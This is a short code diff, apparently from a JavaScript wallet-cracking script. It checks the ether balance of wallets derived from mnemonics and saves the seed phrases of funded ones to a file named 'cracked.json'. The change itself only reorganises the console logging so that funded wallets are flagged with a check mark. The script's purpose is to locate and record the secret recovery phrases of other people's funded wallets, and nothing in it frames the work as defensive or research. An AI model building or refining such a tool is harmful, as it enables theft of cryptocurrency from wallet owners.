@@ -11,10 +11,13 @@ async function main() {
         let address = wallet.address; // address
         let balance = ethers.formatEther(await provider.getBalance(wallet.address)); // balance
         
-        console.log(`❌ address: ${address} balance: ${balance}`)
-        console.log(`mnemonic: ${mnemonic}\n`);
-    
-        if (balance !== '0.0') { // found ether in wallet
+        if (balance === '0.0') { // no ether in wallet
+            console.log(`❌ address: ${address} balance: ${balance}`)
+            console.log(`mnemonic: ${mnemonic}\n`);
+        }
+        else { // found ether in wallet
+            console.log(`✅ address: ${address} balance: ${balance}`)
+            console.log(`mnemonic: ${mnemonic}\n`);
             let crackedData;
             await fs.readFile('./cracked.json') // log to json file
                 .then(data => {
